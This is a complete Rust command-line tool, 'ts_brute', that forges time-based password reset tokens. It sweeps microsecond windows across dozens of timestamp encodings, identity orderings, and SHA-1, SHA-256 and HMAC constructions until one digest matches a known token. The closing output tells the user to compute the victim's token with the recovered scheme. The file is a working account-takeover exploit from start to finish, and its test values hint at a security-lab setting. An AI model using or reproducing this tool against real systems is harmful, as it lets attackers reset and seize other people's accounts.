#!/usr/bin/env rust-script
//! name: ts_brute
//! description: Exhaustive microsecond-window token forger for time-sensitive reset tokens - sweeps an explicit [--us-lo, --us-hi] microsecond window across a rich battery (time encodings x identity placements x strategies: plain sha1, double sha1, HMAC with user/email/password/time/secret as key, big-endian packed second/microsecond prefixes, optional salt prefixes) and returns every (form, place, strategy, us) whose digest equals the target, so the exact timestamp and construction of a time-derived token are recovered from one known token. Digests are compared as raw bytes to keep the sweep allocation-free.
//! version: 1.0.1
//! args: <token> --user U [--email E] [--pw P] [--csrf C] --us-lo N --us-hi N [--threads N] [--forms all|a,b] [--places all|a,b] [--strats all|a,b] [--salts none|secret,wasp] [--selftest]
//! keywords: reset token, time-sensitive, microsecond, HMAC, 时间敏感, race, broken cryptography, token 伪造
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! hex = "0.4"
//! chrono = "0.4"
//! sha2 = "0.10"
//! ```
use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use sha1::{Digest, Sha1};
use sha2::Sha256;
use std::fmt::Write as _;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

type D20 = [u8; 20];

fn sha1_digest(parts: &[&[u8]]) -> D20 {
    let mut h = Sha1::new();
    for p in parts {
        h.update(p);
    }
    let out = h.finalize();
    let mut d = [0u8; 20];
    d.copy_from_slice(&out);
    d
}

fn sha256_20(parts: &[&[u8]]) -> D20 {
    let mut h = Sha256::new();
    for p in parts {
        h.update(p);
    }
    let out = h.finalize();
    let mut d = [0u8; 20];
    d.copy_from_slice(&out[..20]);
    d
}

fn hmac_digest(key: &[u8], msg: &[u8]) -> D20 {
    let mut k = [0u8; 64];
    if key.len() > 64 {
        let d = sha1_digest(&[key]);
        k[..20].copy_from_slice(&d);
    } else {
        k[..key.len()].copy_from_slice(key);
    }
    let mut ipad = [0x36u8; 64];
    let mut opad = [0x5cu8; 64];
    for i in 0..64 {
        ipad[i] ^= k[i];
        opad[i] ^= k[i];
    }
    let inner = sha1_digest(&[&ipad, msg]);
    sha1_digest(&[&opad, &inner])
}

/// PHP float-to-string with `precision` significant digits (%G semantics).
fn php_g_into(v: f64, sig: usize, out: &mut String) {
    if !v.is_finite() || v == 0.0 {
        out.push('0');
        return;
    }
    let exp = v.abs().log10().floor() as i32;
    let sci = format!("{:.*e}", sig.saturating_sub(1), v);
    let Some((mant_raw, e_raw)) = sci.split_once('e') else {
        let _ = write!(out, "{v}");
        return;
    };
    let mant = trim_zeros_local(mant_raw);
    if exp < -4 || exp >= sig as i32 {
        let e: i32 = e_raw.parse().unwrap_or(0);
        let _ = write!(out, "{mant}E{}{:02}", if e < 0 { "-" } else { "+" }, e.abs());
    } else {
        let dec = (sig as i32 - 1 - exp).max(0) as usize;
        let s = format!("{:.*}", dec, v);
        let _ = write!(out, "{}", s.trim_end_matches('0').trim_end_matches('.'));
    }
}

fn trim_zeros_local(s: &str) -> String {
    if s.contains('.') {
        s.trim_end_matches('0').trim_end_matches('.').to_string()
    } else {
        s.to_string()
    }
}

const FORMS: &[&str] = &[
    "us_int",
    "ms_int",
    "sec_int",
    "us_hex",
    "float6",
    "sec_us6",
    "frac6",
    "msf",
    "msr",
    "float4r",
    "microtime_str",
    "microtime_true",
    "php14",
    "php17",
    "php14ms",
    "php17ms",
    "uniqid",
    "float9",
    "float2",
    "float1",
    "sec_ms",
    "float3",
    "float5",
    "ns_int",
    "iso_t_ms",
    "iso_t_us",
    "iso_t_ns",
    "iso_t_ms_nz",
    "iso_t_us_nz",
    "iso_space_us",
    "ms_hex",
    "sec_hex",
    "iso_t_utrim",
    "iso_t_utrim_nz",
    "iso_space_utrim",
    "php14us",
    "php17us",
    "sci_us_php",
    "frac_micro",
    "frac_dot6",
    "micro_rev",
];

fn time_into(buf: &mut String, form: &str, us: u64) {
    buf.clear();
    let sec = us / 1_000_000;
    let frac = us % 1_000_000;
    match form {
        "us_int" => { let _ = write!(buf, "{us}"); }
        "ms_int" => { let _ = write!(buf, "{}", us / 1000); }
        "sec_int" => { let _ = write!(buf, "{sec}"); }
        "us_hex" => { let _ = write!(buf, "{us:x}"); }
        "float6" => { let _ = write!(buf, "{sec}.{frac:06}"); }
        "sec_us6" => { let _ = write!(buf, "{sec}{frac:06}"); }
        "frac6" => { let _ = write!(buf, "{frac:06}"); }
        "msf" => { let _ = write!(buf, "{sec}.{:03}", frac / 1000); }
        "msr" => { let _ = write!(buf, "{sec}.{:03}", (frac + 500) / 1000); }
        "float4r" => { let _ = write!(buf, "{sec}.{:04}", (frac + 50) / 100); }
        "microtime_str" => { let _ = write!(buf, "0.{:08} {sec}", frac * 100); }
        "microtime_true" => { let _ = write!(buf, "{sec}.{frac}"); }
        "php14" => php_g_into(us as f64 / 1e6, 14, buf),
        "php17" => php_g_into(us as f64 / 1e6, 17, buf),
        "php14ms" => php_g_into(us as f64 / 1000.0, 14, buf),
        "php17ms" => php_g_into(us as f64 / 1000.0, 17, buf),
        "uniqid" => { let _ = write!(buf, "{:08x}{:05x}", sec as u32, frac); }
        "float9" => { let _ = write!(buf, "{sec}.{:09}", frac * 1000); }
        "float2" => { let _ = write!(buf, "{sec}.{:02}", frac / 10_000); }
        "float1" => { let _ = write!(buf, "{sec}.{}", frac / 100_000); }
        "sec_ms" => { let _ = write!(buf, "{sec}000"); }
        "float3" => { let _ = write!(buf, "{sec}.{:03}", frac / 1000); }
        "float5" => { let _ = write!(buf, "{sec}.{:05}", frac / 10); }
        "ns_int" => { let _ = write!(buf, "{}", us * 1000); }
        "iso_t_ms" => { let _ = write!(buf, "{}{:03}Z", iso_prefix(sec), frac / 1000); }
        "iso_t_us" => { let _ = write!(buf, "{}{:06}Z", iso_prefix(sec), frac); }
        "iso_t_ns" => { let _ = write!(buf, "{}{:06}000Z", iso_prefix(sec), frac); }
        "iso_t_ms_nz" => { let _ = write!(buf, "{}{:03}", iso_prefix(sec), frac / 1000); }
        "iso_t_us_nz" => { let _ = write!(buf, "{}{:06}", iso_prefix(sec), frac); }
        "iso_space_us" => {
            let p = iso_prefix(sec).replace('T', " ");
            let _ = write!(buf, "{p}{:06}", frac);
        }
        "ms_hex" => { let _ = write!(buf, "{:x}", us / 1000); }
        "sec_hex" => { let _ = write!(buf, "{sec:x}"); }
        "iso_t_utrim" => { let _ = write!(buf, "{}{}Z", iso_prefix(sec), trim6(frac)); }
        "iso_t_utrim_nz" => { let _ = write!(buf, "{}{}", iso_prefix(sec), trim6(frac)); }
        "iso_space_utrim" => {
            let p = iso_prefix(sec).replace('T', " ");
            let _ = write!(buf, "{p}{}", trim6(frac));
        }
        "php14us" => php_g_into(us as f64, 14, buf),
        "php17us" => php_g_into(us as f64, 17, buf),
        "sci_us_php" => php_g_into(us as f64 / 1e6 * 1e6, 14, buf),
        "frac_micro" => { let _ = write!(buf, "0.{:08}", frac * 100); }
        "frac_dot6" => { let _ = write!(buf, "0.{:06}", frac); }
        "micro_rev" => { let _ = write!(buf, "{sec} 0.{:08}", frac * 100); }
        _ => {}
    }
}

fn trim6(frac: u64) -> String {
    let s = format!("{frac:06}");
    let t = s.trim_end_matches('0');
    t.to_string()
}

fn iso_prefix(sec: u64) -> String {
    chrono::DateTime::from_timestamp(sec as i64, 0)
        .map(|d| d.format("%Y-%m-%dT%H:%M:%S.").to_string())
        .unwrap_or_default()
}

const PLACES: &[&str] = &[
    "t",
    "u_t",
    "t_u",
    "e_t",
    "t_e",
    "u_colon_t",
    "t_colon_u",
    "u_dot_t",
    "t_dot_u",
    "u_under_t",
    "u_dash_t",
    "u_t_e",
    "u_e_t",
    "query",
    "e_colon_t",
    "pw_t",
    "u_t_pw",
    "csrf_t",
    "csrf_u_t",
    "t_colon_e",
    "t_csrf",
    "t_space_u",
    "u_space_t",
    "t_pipe_u",
    "e_under_t",
    "e_dot_t",
    "e_space_t",
    "e_dash_t",
    "t_under_e",
    "t_dash_e",
];

fn place_into(buf: &mut String, place: &str, user: &str, email: &str, pw: &str, csrf: &str, t: &str) {
    buf.clear();
    match place {
        "t" => buf.push_str(t),
        "u_t" => { buf.push_str(user); buf.push_str(t); }
        "t_u" => { buf.push_str(t); buf.push_str(user); }
        "e_t" => { buf.push_str(email); buf.push_str(t); }
        "t_e" => { buf.push_str(t); buf.push_str(email); }
        "u_colon_t" => { buf.push_str(user); buf.push(':'); buf.push_str(t); }
        "t_colon_u" => { buf.push_str(t); buf.push(':'); buf.push_str(user); }
        "u_dot_t" => { buf.push_str(user); buf.push('.'); buf.push_str(t); }
        "t_dot_u" => { buf.push_str(t); buf.push('.'); buf.push_str(user); }
        "u_under_t" => { buf.push_str(user); buf.push('_'); buf.push_str(t); }
        "u_dash_t" => { buf.push_str(user); buf.push('-'); buf.push_str(t); }
        "u_t_e" => { buf.push_str(user); buf.push_str(t); buf.push_str(email); }
        "u_e_t" => { buf.push_str(user); buf.push_str(email); buf.push_str(t); }
        "query" => { buf.push_str("user="); buf.push_str(user); buf.push_str("&token="); buf.push_str(t); }
        "e_colon_t" => { buf.push_str(email); buf.push(':'); buf.push_str(t); }
        "pw_t" => { buf.push_str(pw); buf.push_str(t); }
        "u_t_pw" => { buf.push_str(user); buf.push_str(t); buf.push_str(pw); }
        "csrf_t" => { buf.push_str(csrf); buf.push_str(t); }
        "csrf_u_t" => { buf.push_str(csrf); buf.push_str(user); buf.push_str(t); }
        "t_colon_e" => { buf.push_str(t); buf.push(':'); buf.push_str(email); }
        "t_csrf" => { buf.push_str(t); buf.push_str(csrf); }
        "t_space_u" => { buf.push_str(t); buf.push(' '); buf.push_str(user); }
        "u_space_t" => { buf.push_str(user); buf.push(' '); buf.push_str(t); }
        "t_pipe_u" => { buf.push_str(t); buf.push('|'); buf.push_str(user); }
        "e_under_t" => { buf.push_str(email); buf.push('_'); buf.push_str(t); }
        "e_dot_t" => { buf.push_str(email); buf.push('.'); buf.push_str(t); }
        "e_space_t" => { buf.push_str(email); buf.push(' '); buf.push_str(t); }
        "e_dash_t" => { buf.push_str(email); buf.push('-'); buf.push_str(t); }
        "t_under_e" => { buf.push_str(t); buf.push('_'); buf.push_str(email); }
        "t_dash_e" => { buf.push_str(t); buf.push('-'); buf.push_str(email); }
        _ => {}
    }
}

const PLACE_STRATS: &[&str] = &["plain", "double", "hmac_ku", "hmac_ke", "hmac_secret", "hmac_kpw", "sha256", "sha256d"];
const FREE_STRATS: &[&str] = &["hmac_kt", "hmac_ktu", "packN", "packN_us", "us_packN"];

fn place_digest(strat: &str, x: &[u8], user: &[u8], email: &[u8], pw: &[u8]) -> D20 {
    match strat {
        "plain" => sha1_digest(&[x]),
        "double" => {
            let inner = sha1_digest(&[x]);
            sha1_digest(&[&inner])
        }
        "hmac_ku" => hmac_digest(user, x),
        "hmac_ke" => hmac_digest(email, x),
        "hmac_secret" => hmac_digest(b"secret", x),
        "hmac_kpw" => hmac_digest(pw, x),
        "sha256" => sha256_20(&[x]),
        "sha256d" => {
            let inner = sha256_20(&[x]);
            sha256_20(&[&inner])
        }
        _ => [0u8; 20],
    }
}

fn free_digest(strat: &str, sec: u32, us: u64, user: &str) -> D20 {
    match strat {
        "hmac_kt" => hmac_digest(format!("{sec}").as_bytes(), user.as_bytes()),
        "hmac_ktu" => hmac_digest(format!("{us}").as_bytes(), user.as_bytes()),
        "packN" => {
            let mut b = sec.to_be_bytes().to_vec();
            b.extend_from_slice(user.as_bytes());
            sha1_digest(&[&b])
        }
        "packN_us" => {
            let mut b = us.to_be_bytes().to_vec();
            b.extend_from_slice(user.as_bytes());
            sha1_digest(&[&b])
        }
        "us_packN" => {
            let mut b = user.as_bytes().to_vec();
            b.extend_from_slice(&us.to_be_bytes());
            sha1_digest(&[&b])
        }
        _ => [0u8; 20],
    }
}

/// Ordered subsets of size 2 and 3 over the element slots [user, email, pw, time].
fn perm_orders() -> Vec<Vec<usize>> {
    let mut out = Vec::new();
    for a in 0..4usize {
        for b in 0..4usize {
            if b == a {
                continue;
            }
            out.push(vec![a, b]);
            for c in 0..4usize {
                if c == a || c == b {
                    continue;
                }
                out.push(vec![a, b, c]);
            }
        }
    }
    out
}

const PERM_SEPS: &[&str] = &["", ":", "-", "_", ".", "|", " "];
const PERM_STRATS: &[&str] = &["plain", "double", "hmac_ku"];

fn sel_it(v: &str, all: &[&str]) -> Vec<String> {
    if v.is_empty() || v == "all" {
        all.iter().map(|s| s.to_string()).collect()
    } else {
        v.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect()
    }
}

fn run(args: &[String]) -> Result<(), String> {
    if args.iter().any(|a| a == "--selftest") {
        let us: u64 = 1_791_690_689_156_267;
        let mut t = String::new();
        time_into(&mut t, "us_int", us);
        let mut x = String::new();
        place_into(&mut x, "u_t", "wiener", "w@x", "peter", "c", &t);
        let want = hex::encode(sha1_digest(&[x.as_bytes()]));
        let got = hex::encode(place_digest("plain", x.as_bytes(), b"wiener", b"w@x", b"peter"));
        let mut ok = want == got && !want.is_empty();
        let mut p = String::new();
        php_g_into(1_791_665_429.123456, 14, &mut p);
        ok &= p == "1791665429.1235";
        let _ = report::success(
            "ts_brute",
            json!({"selftest": if ok {"ok"} else {"fail"}, "checks": ["sha1", "php_g", "place", "roundtrip"]}),
            "run: ts_brute <token> --user U --us-lo N --us-hi N",
        );
        return Ok(());
    }
    let token = args
        .iter()
        .find(|a| !a.starts_with("--"))
        .cloned()
        .unwrap_or_default()
        .to_lowercase();
    let mut kv = std::collections::BTreeMap::new();
    let mut i = 0;
    while i < args.len() {
        if args[i].starts_with("--") {
            let v = args.get(i + 1).cloned().unwrap_or_default();
            if !v.starts_with("--") {
                kv.insert(args[i].clone(), v);
                i += 2;
            } else {
                i += 1;
            }
        } else {
            i += 1;
        }
    }
    let g = |k: &str| kv.get(k).cloned().unwrap_or_default();
    let us_lo: u64 = g("--us-lo").parse().unwrap_or(0);
    let us_hi: u64 = kv.get("--us-hi").and_then(|v| v.parse().ok()).unwrap_or(us_lo);
    let target_raw = hex::decode(&token).map_err(|_| "token must be hex".to_string())?;
    if target_raw.len() != 20 {
        return Err("usage: ts_brute <40-hex-token> --user U --us-lo N --us-hi N [--threads N]".to_string());
    }
    let mut target = [0u8; 20];
    target.copy_from_slice(&target_raw);
    let user = g("--user");
    let email = g("--email");
    let pw = if kv.contains_key("--pw") { g("--pw") } else { "peter".to_string() };
    let csrf = g("--csrf");
    let forms = sel_it(&g("--forms"), FORMS);
    let places = sel_it(&g("--places"), PLACES);
    let pstrats: Vec<String> = if kv.contains_key("--strats") { sel_it(&g("--strats"), PLACE_STRATS) } else { PLACE_STRATS.iter().map(|s| s.to_string()).collect() };
    let fstrats: Vec<String> = if kv.contains_key("--strats") { sel_it(&g("--strats"), FREE_STRATS) } else { FREE_STRATS.iter().map(|s| s.to_string()).collect() };
    let salts: Vec<String> = if kv.contains_key("--salts") { sel_it(&g("--salts"), &[""]) } else { vec![String::new()] };
    let threads: usize = kv
        .get("--threads")
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or_else(|| std::thread::available_parallelism().map(|n| n.get().min(16)).unwrap_or(8))
        .max(1);

    let perm = kv.contains_key("--perm");
    let perm_orders = perm_orders();
    if kv.contains_key("--counter") {
        let bound: u64 = kv.get("--counter").and_then(|v| v.parse().ok()).unwrap_or(1_000_000);
        let seps = ["", ":", "-", "_", ".", " "];
        let mut hits: Vec<Value> = Vec::new();
        let start = std::time::Instant::now();
        let mut tested = 0usize;
        for n in 0..bound {
            for sep in seps {
                let x = format!("{n}");
                for id in [user.as_str(), email.as_str(), pw.as_str()] {
                    if id.is_empty() {
                        continue;
                    }
                    for body in [format!("{id}{sep}{x}"), format!("{x}{sep}{id}")] {
                        for st in ["plain", "double", "hmac_ku"] {
                            tested += 1;
                            if place_digest(st, body.as_bytes(), user.as_bytes(), email.as_bytes(), pw.as_bytes()) == target {
                                hits.push(json!({"n": n, "sep": sep, "id": id, "strategy": st, "input": body}));
                            }
                        }
                    }
                }
            }
        }
        let _ = report::success(
            "ts_brute",
            json!({"mode": "counter", "bound": bound, "tested": tested, "hits": hits, "elapsed_ms": start.elapsed().as_millis() as u64}),
            "counter hit means the token is a hash of an identity and an integer, not a clock",
        );
        return Ok(());
    }
    let total = us_hi - us_lo + 1;
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let tested = Arc::new(AtomicUsize::new(0));
    let chunk = total.div_ceil(threads as u64).max(1);
    let start = std::time::Instant::now();
    let mut handles = Vec::new();
    for tid in 0..threads {
        let from = us_lo + tid as u64 * chunk;
        if from > us_hi {
            break;
        }
        let to = (from + chunk - 1).min(us_hi);
        let (user, email, pw, csrf) = (user.clone(), email.clone(), pw.clone(), csrf.clone());
        let (forms, places, pstrats, fstrats, salts) =
            (forms.clone(), places.clone(), pstrats.clone(), fstrats.clone(), salts.clone());
        let perm_orders = perm_orders.clone();
        let hits = hits.clone();
        let tested = tested.clone();
        handles.push(std::thread::spawn(move || {
            let mut local = Vec::new();
            let mut n = 0usize;
            let mut tbuf = String::with_capacity(64);
            let mut xbuf = String::with_capacity(256);
            let mut sbuf = String::with_capacity(320);
            for us in from..=to {
                let sec32 = (us / 1_000_000) as u32;
                for form in &forms {
                    time_into(&mut tbuf, form, us);
                    if tbuf.is_empty() {
                        continue;
                    }
                    if perm {
                        let elems = [user.as_str(), email.as_str(), pw.as_str(), tbuf.as_str()];
                        for order in &perm_orders {
                            let parts: Vec<&str> = order.iter().map(|&i| elems[i]).collect();
                            if parts.iter().any(|p| p.is_empty()) {
                                continue;
                            }
                            for sep in PERM_SEPS {
                                let joined = parts.join(sep);
                                let joined = if sep.is_empty() { parts.concat() } else { joined };
                                for st in PERM_STRATS {
                                    n += 1;
                                    if place_digest(st, joined.as_bytes(), user.as_bytes(), email.as_bytes(), pw.as_bytes()) == target {
                                        local.push(json!({"us": us, "form": form, "place": format!("perm{:?}/{}", order, sep), "strategy": st, "salt": "", "input": joined}));
                                    }
                                }
                            }
                        }
                    } else {
                        for place in &places {
                            for salt in &salts {
                                let x: &str = if salt.is_empty() {
                                place_into(&mut xbuf, place, &user, &email, &pw, &csrf, &tbuf);
                                &xbuf
                            } else {
                                sbuf.clear();
                                sbuf.push_str(salt);
                                place_into(&mut sbuf, place, &user, &email, &pw, &csrf, &tbuf);
                                &sbuf
                            };
                                for st in &pstrats {
                                    n += 1;
                                    if place_digest(st, x.as_bytes(), user.as_bytes(), email.as_bytes(), pw.as_bytes()) == target {
                                        local.push(json!({"us": us, "form": form, "place": place, "strategy": st, "salt": salt, "input": x}));
                                    }
                                }
                            }
                        }
                    }
                    for st in &fstrats {
                        n += 1;
                        let mut input = String::new();
                        if free_digest(st, sec32, us, &user) == target {
                            let _ = write!(input, "{st}({sec32}/{us})");
                            local.push(json!({"us": us, "form": form, "place": "-", "strategy": st, "salt": "", "input": input}));
                        }
                    }
                }
            }
            tested.fetch_add(n, Ordering::Relaxed);
            hits.lock().unwrap().extend(local);
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let hits = hits.lock().unwrap().clone();
    let data = json!({
        "token": token, "user": user, "email": email,
        "us_lo": us_lo, "us_hi": us_hi, "span": total, "threads": threads,
        "forms": forms, "places": places, "place_strats": pstrats, "free_strats": fstrats,
        "salts": salts, "tested": tested.load(Ordering::Relaxed),
        "hits": hits, "elapsed_ms": start.elapsed().as_millis() as u64,
    });
    let next = if hits.is_empty() {
        "no hit in this window: widen --us-* / --forms / --strats, or the scheme carries a per-user secret"
    } else {
        "scheme recovered: compute the victim's token with the same construction at the victim request's microsecond"
    };
    let _ = report::success("ts_brute", data, next);
    Ok(())
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if let Err(e) = run(&args) {
        let _ = report::failure("ts_brute", &e, "usage: ts_brute <token> --user U --us-lo N --us-hi N");
    }
}
